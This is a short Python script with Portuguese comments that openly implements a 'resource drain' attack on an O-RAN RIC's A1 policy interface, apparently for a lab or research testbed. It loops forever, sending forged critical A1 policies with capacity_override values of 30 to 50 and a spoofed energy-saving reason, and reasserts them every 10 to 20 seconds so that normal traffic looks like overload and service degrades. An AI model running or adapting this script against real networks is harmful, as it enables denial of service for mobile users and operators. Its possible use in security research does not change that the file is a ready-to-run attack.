"""
ataque_resource_drain.py - Ataque de Dreno de Recursos (rApp)
Alvo: Interface A1 do RIC - Capacity Override
Efeito: Forca capacity_override=50 via politica A1 com severity=critical.
        O xApp enxerga capacity reduzido pela metade, fazendo com que
        mesmo cargas normais (>50Mbps) parecam >100% de utilizacao.
        Causa: degradacao de servico em 50% da capacidade original.
"""

import threading
import urllib.request
import json
import time
import random
import sys

RIC_HOST = sys.argv[1] if len(sys.argv) > 1 else "ric-service"
RIC_PORT = sys.argv[2] if len(sys.argv) > 2 else "8080"
BASE_URL = f"http://{RIC_HOST}:{RIC_PORT}"

print("=" * 60)
print("  ATAQUE: RESOURCE DRAIN (rApp)")
print(f"  Alvo: {BASE_URL}")
print("  Forca capacity=50 - degradacao de 50%")
print("=" * 60)

# Niveis de capacity para variar o ataque
CAPACITY_LEVELS = [50, 40, 30, 50, 45, 35]

def ataque_resource_drain():
    """Forca capacity minimo recorrentemente"""
    # Delay inicial para outros ataques comecarem
    time.sleep(5)
    
    idx = 0
    while True:
        try:
            idx = (idx + 1) % len(CAPACITY_LEVELS)
            capacity_alvo = CAPACITY_LEVELS[idx]
            
            ataque = {
                "type": "A1_POLICY",
                "scope": "UE_GROUP_ALL",
                "value": True,
                "severity": "critical",
                "capacity_override": capacity_alvo,
                "reason": "ENERGY_SAVING_CRITICAL",
                "attacker": "true",
                "persistent": True,
                "ttl": 300
            }
            
            data = json.dumps(ataque).encode()
            req = urllib.request.Request(BASE_URL, data=data, method="PUT")
            req.add_header('Content-Type', 'application/json')
            with urllib.request.urlopen(req, timeout=2):
                print(f"  [ResourceDrain] Capacity forcado para {capacity_alvo}!")
            
            time.sleep(random.randint(10, 20))  # Reforca a cada 10-20s
            
        except Exception as e:
            print(f"[ResourceDrain] Erro: {e}")
            time.sleep(5)

if __name__ == "__main__":
    try:
        ataque_resource_drain()
    except KeyboardInterrupt:
        print("\n[!] Ataque interrompido pelo operador")
        sys.exit(0)